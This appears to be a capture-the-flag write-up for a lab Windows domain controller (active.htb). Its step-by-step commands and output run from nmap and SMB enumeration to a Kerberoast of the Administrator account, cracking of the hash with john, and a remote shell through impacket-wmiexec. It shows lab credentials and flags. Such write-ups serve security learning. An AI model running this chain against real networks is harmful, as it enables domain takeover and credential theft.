
```
kali@kali ~> nmap -sC -sV 10.10.10.100
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-12 16:05 EST
Nmap scan report for 10.10.10.100
Host is up (0.12s latency).
Not shown: 982 closed tcp ports (conn-refused)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-02-12 21:06:10Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49165/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled and required
|_clock-skew: -1s
| smb2-time: 
|   date: 2024-02-12T21:07:10
|_  start_date: 2024-02-12T20:54:29

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 101.58 seconds
```



```
kali@kali ~> nxc smb 10.10.10.100 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' --shares
SMB         10.10.10.100    445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.100    445    DC               [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18 
SMB         10.10.10.100    445    DC               [*] Enumerated shares
SMB         10.10.10.100    445    DC               Share           Permissions     Remark
SMB         10.10.10.100    445    DC               -----           -----------     ------
SMB         10.10.10.100    445    DC               ADMIN$                          Remote Admin
SMB         10.10.10.100    445    DC               C$                              Default share
SMB         10.10.10.100    445    DC               IPC$                            Remote IPC
SMB         10.10.10.100    445    DC               NETLOGON        READ            Logon server share 
SMB         10.10.10.100    445    DC               Replication     READ            
SMB         10.10.10.100    445    DC               SYSVOL          READ            Logon server share 
SMB         10.10.10.100    445    DC               Users           READ            

```



```
                               __                                __ 
  ___ _   ___    ___  ____ ___/ / ___  ____  ____  __ __   ___  / /_
 / _ `/  / _ \  / _ \/___// _  / / -_)/ __/ / __/ / // /  / _ \/ __/
 \_, /  / .__/ / .__/     \_,_/  \__/ \__/ /_/    \_, /  / .__/\__/ 
/___/  /_/    /_/                                /___/  /_/         

[ * ] Username: active.htb\SVC_TGS
[ * ] Password: GPPstillStandingStrong2k18
kali@kali ~/gpp-decrypt (master)> cat /home/kali/user.txt 
b338ee372671a027c85f695bb916af63

```



---


trying our best attempt to privesc

```
kali@kali ~/BloodHound.py (master)> python bloodhound.py -d htb.local -v --zip -c All -dc active.htb -ns 10.10.10.100
```

```
kali@kali ~> impacket-GetADUsers active.htb/SVC_TGS -all -dc-ip 10.10.10.100
Impacket v0.11.0 - Copyright 2023 Fortra

Password:
[*] Querying 10.10.10.100 for information about domain.
Name                  Email                           PasswordLastSet      LastLogon           
--------------------  ------------------------------  -------------------  -------------------
Administrator                                         2018-07-18 15:06:40.351723  2024-02-13 03:51:09.883745 
Guest                                                 <never>              <never>             
krbtgt                                                2018-07-18 14:50:36.972031  <never>             
SVC_TGS                                               2018-07-18 16:14:38.402764  2024-02-13 04:37:18.576608 
```



through bloodhound python i was able to look at the kerbroasting interactions to find out that the admin can be kerbroasted

```
kali@kali ~> bloodhound-python -d active.htb -v --zip -c All -dc active.htb -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18'  -ns 10.10.10.100 --zip
DEBUG: Authentication: username/password
DEBUG: Resolved collection methods: localadmin, psremote, container, session, group, trusts, dcom, rdp, objectprops, acl
DEBUG: Using DNS to retrieve domain information
DEBUG: Querying domain controller information from DNS
DEBUG: Using domain hint: active.htb
INFO: Found AD domain: active.htb
DEBUG: Found primary DC: dc.active.htb
DEBUG: Found Global Catalog server: dc.active.htb
DEBUG: Found KDC for enumeration domain: dc.active.htb
INFO: Getting TGT for user
DEBUG: Trying to connect to KDC at active.htb:88
DEBUG: Traceback (most recent call last):
  File "/usr/lib/python3/dist-packages/impacket/krb5/kerberosv5.py", line 63, in sendReceive
    s.connect(sa)
TimeoutError: [Errno 110] Connection timed out

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/home/kali/.local/lib/python3.11/site-packages/bloodhound/ad/authentication.py", line 191, in get_tgt
    tgt, cipher, _, session_key = getKerberosTGT(username, self.password, self.userdomain,
                                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3/dist-packages/impacket/krb5/kerberosv5.py", line 185, in getKerberosTGT
    r = sendReceive(message, domain, kdcHost)
        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3/dist-packages/impacket/krb5/kerberosv5.py", line 65, in sendReceive
    raise socket.error("Connection error (%s:%s)" % (targetHost, port), e)
OSError: [Errno Connection error (active.htb:88)] [Errno 110] Connection timed out

WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (active.htb:88)] [Errno 110] Connection timed out
DEBUG: Using LDAP server: active.htb
DEBUG: Using base DN: DC=active,DC=htb
DEBUG: Using kerberos KDC: dc.active.htb
DEBUG: Using kerberos realm: ACTIVE.HTB
INFO: Connecting to LDAP server: active.htb
DEBUG: Authenticating to LDAP server with NTLM
DEBUG: No LAPS attributes found in schema
DEBUG: No KeyCredentialLink attributes found in schema
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
DEBUG: No support for GMSA, skipping in query
DEBUG: Writing users to file: 20240213063250_users.json
DEBUG: Don't care about acetype 6
DEBUG: Don't care about acetype 6
INFO: Connecting to LDAP server: active.htb
DEBUG: Don't care about acetype 6
DEBUG: Don't care about acetype 6
DEBUG: Authenticating to LDAP server with NTLM
DEBUG: Querying resolver LDAP for SID S-1-5-21-405608879-3187717380-1996298813-512
DEBUG: Querying resolver LDAP for SID S-1-5-21-405608879-3187717380-1996298813-519
INFO: Found 5 users
DEBUG: Finished writing users
DEBUG: Writing groups to file: 20240213063250_groups.json
DEBUG: Querying resolver LDAP for DN CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb
DEBUG: Querying resolver LDAP for DN CN=Domain Admins,CN=Users,DC=active,DC=htb
DEBUG: Querying resolver LDAP for DN CN=Cert Publishers,CN=Users,DC=active,DC=htb
DEBUG: Querying resolver LDAP for DN CN=Enterprise Admins,CN=Users,DC=active,DC=htb
DEBUG: Querying resolver LDAP for DN CN=Schema Admins,CN=Users,DC=active,DC=htb
DEBUG: Querying resolver LDAP for DN CN=Domain Controllers,CN=Users,DC=active,DC=htb
DEBUG: Querying resolver LDAP for DN CN=S-1-5-9,CN=ForeignSecurityPrincipals,DC=active,DC=htb
DEBUG: Querying resolver LDAP for DN CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=active,DC=htb
DEBUG: Querying resolver LDAP for DN CN=S-1-5-17,CN=ForeignSecurityPrincipals,DC=active,DC=htb
DEBUG: Querying resolver LDAP for DN CN=S-1-5-4,CN=ForeignSecurityPrincipals,DC=active,DC=htb
INFO: Found 41 groups
DEBUG: Finished writing groups
DEBUG: Writing GPOs to file: 20240213063250_gpos.json
INFO: Found 2 gpos
DEBUG: Finished writing GPO
DEBUG: Writing OU to file: 20240213063250_ous.json
INFO: Found 1 ous
DEBUG: Finished writing OU
DEBUG: Writing containers to file: 20240213063250_containers.json
DEBUG: Querying resolver LDAP for SID S-1-5-21-405608879-3187717380-1996298813-553
INFO: Found 19 containers
DEBUG: Finished writing containers
DEBUG: Opening file for writing: 20240213063250_domains.json
DEBUG: Querying resolver LDAP for SID S-1-5-21-405608879-3187717380-1996298813-498
DEBUG: Querying resolver LDAP for SID S-1-5-21-405608879-3187717380-1996298813-516
INFO: Found 0 trusts
DEBUG: Finished writing domain info
INFO: Starting computer enumeration with 10 workers
DEBUG: Start working
DEBUG: Start working
DEBUG: Start working
DEBUG: Start working
DEBUG: Start working
DEBUG: Start working
DEBUG: Start working
DEBUG: Start working
DEBUG: Start working
DEBUG: Start working
INFO: Querying computer: DC.active.htb
DEBUG: Querying computer: DC.active.htb
DEBUG: Resolved: 10.10.10.100
DEBUG: Trying connecting to computer: DC.active.htb
DEBUG: DCE/RPC binding: ncacn_np:10.10.10.100[\PIPE\srvsvc]
DEBUG: DCE/RPC binding: ncacn_np:10.10.10.100[\PIPE\samr]
DEBUG: Opening domain handle
DEBUG: Found 544 SID: S-1-5-21-405608879-3187717380-1996298813-500
DEBUG: Found 544 SID: S-1-5-21-405608879-3187717380-1996298813-519
DEBUG: Found 544 SID: S-1-5-21-405608879-3187717380-1996298813-512
DEBUG: DCE/RPC binding: ncacn_np:10.10.10.100[\PIPE\lsarpc]
DEBUG: Resolved SID to name: ADMINISTRATOR@ACTIVE.HTB
DEBUG: Resolved SID to name: ENTERPRISE ADMINS@ACTIVE.HTB
DEBUG: Resolved SID to name: DOMAIN ADMINS@ACTIVE.HTB
DEBUG: DCE/RPC binding: ncacn_np:10.10.10.100[\PIPE\samr]
DEBUG: Opening domain handle
DEBUG: DCE/RPC binding: ncacn_np:10.10.10.100[\PIPE\samr]
DEBUG: Opening domain handle
DEBUG: DCE/RPC binding: ncacn_np:10.10.10.100[\PIPE\samr]
DEBUG: Opening domain handle
DEBUG: No group with RID 580 exists
DEBUG: Write worker obtained a None value, exiting
DEBUG: Write worker is done, closing files
INFO: Done in 00M 15S
INFO: Compressing output into 20240213063250_bloodhound.zip

```



Actually getting into kerbroasting

```
kali@kali ~> impacket-GetUserSPNs active.htb/SVC_TGS -dc-ip 10.10.10.100 -outputfile kerberoastables.txt
Impacket v0.11.0 - Copyright 2023 Fortra

Password:
ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2024-02-13 03:51:09.883745             



[-] CCache file is not found. Skipping...
kali@kali ~> cat kerberoastables.txt
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$c53c87592442f618cb27bc8f73be4b89$62d0bfeef615f0f0c778b541bf5ed02f00d51143869949596370d50ffc488780acf0ca304470f0c4c328b78729ecab53968d777ae9f990b22d988e276257e11eb2aadbb9c2b3926e33b86a48899ebe6de35f3b64fa8e96ef97c86f14587ade0f53ed164aa86ea543fbbae8434fc4f0508eba80ac22970e07e5cd53fd149b29fbe4f53766da54861f649deb538ac5826a43dfa2c4d6f9166d0127800f0dbf9b14f8530de142ab89b4035bd1216d80c0e0f3c27e5d07d0bc1375fd1c5e4005105920f2be98a0eb0725e9f4c3b8aa56f10b4a254341e072f1ce5ad471ea7b4486123bc5f947e47e16dbfa1889eee26772692e26888a4766105b63203289268818ea1ab41557ec3a8962dd31b25fbec4ab4a6a374dafa8eedf8db47b3470739ef5c3901576e13fbb5ae42df311770c30bb211c43031c49170d0bccf1eb106ee3b28c110dd9cbce3c7f3427efcacb67b12c4b59b3820119b1025b2e117d621944b2842fee0db79f4fb90281e8d4057cbed4842f540e0046bd80572ebea21278b32b0ed58330143eb2e00ddf47dc7fea8f0ac035f399fce32753d68d58d61513dae814cb5cf501f842eb333d8f7b7b67b5f777d857f6397c8a4a57d75719bf6d132853aa4ddb8dce8b41db2e18365ac07ac556ff67e6de204ac652f8b8b92d72c5e8ef5a266f4b9bb522673945487172e3c7c0f784742298fd888e8e71f9a8cbb1de974c2d5ee08f813b9445414a9b51d0970f1b93905e0fd9e95871403b6df7b35170e6225abf3e23706e0472ab74d74f5aebd23b919c46ca0f1d24c7eaf59530e0179b17ecdd1a1f085d8f2dde22bb65479e2709493a7ae692acf2f9ef75bf318ef044fbf90fd308b78aa0592585a66ee9ccb6dbf8998f11e22d4e51e7270b850b6b3e92d6b432003a93abc9b85832f99a5f60d42822f5fc65d498983e36961ec5ad0602a7084383c1fb8d0f1a7149ef8b506b3038e3cf050014b3a0f0663f40f7f231621c794a4c1c953f6f227a4239a38fc75d020f1ce3502be2411c77948e1a45d9e3937954a2a864047ca6314b151bbfdbd8895982a25498bc5150feacc4cfa600d5aa72439a78ab47923ba9afd091342fe593e8f985990a9491b56f5fe1b1f0582596249038a509fde935ace1757174ed521f4238f2603e804be95c126104726c64051f05198a5576ebabbc0944df2ccb97e669b256ca3adf09353015dd13b7a429ca48b4d44f8814889720d88168b280b9188501d85db9405a

```



Cracking it

```
kali@kali ~> john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt kerberoastables.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Ticketmaster1968 (?) <-------------------------------------------- Password
1g 0:00:00:22 DONE (2024-02-13 05:03) 0.04393g/s 463004p/s 463004c/s 463004C/s Tiffani1432..Thrash1
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

getting that root flag

```
kali@kali ~> nxc smb 10.10.10.100 -u 'Administrator' -p 'Ticketmaster1968' --get-file \\Users\\Administrator\\Desktop\\root.txt root2.txt
SMB         10.10.10.100    445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.100    445    DC               [+] active.htb\Administrator:Ticketmaster1968 (Pwn3d!)
SMB         10.10.10.100    445    DC               [*] Copying "\Users\Administrator\Desktop\root.txt" to "root2.txt"
SMB         10.10.10.100    445    DC               [+] File "\Users\Administrator\Desktop\root.txt" was downloaded to "root2.txt"

```



### Alternatives where wmiexec can ALSO be used


```
kali@kali ~ [1]> impacket-wmiexec active.htb/administrator:Ticketmaster1968@10.10.10.100
Impacket v0.11.0 - Copyright 2023 Fortra

[*] SMBv2.1 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
active\administrator

C:\>cd C:\Users\Administrator\Desktop
C:\Users\Administrator\Desktop>dir
[-] Decoding error detected, consider running chcp.com at the target,
map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
and then execute wmiexec.py again with -codec and the corresponding codec
 Volume in drive C has no label.
 Volume Serial Number is 15BB-D59C

 Directory of C:\Users\Administrator\Desktop

21/01/2021  06:49 ��    <DIR>          .
21/01/2021  06:49 ��    <DIR>          ..
13/02/2024  10:51 ��                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)   1.108.332.544 bytes free

C:\Users\Administrator\Desktop>type root.txt
0cb2a5850ed5d24b97cecf0a2ec86aeb

```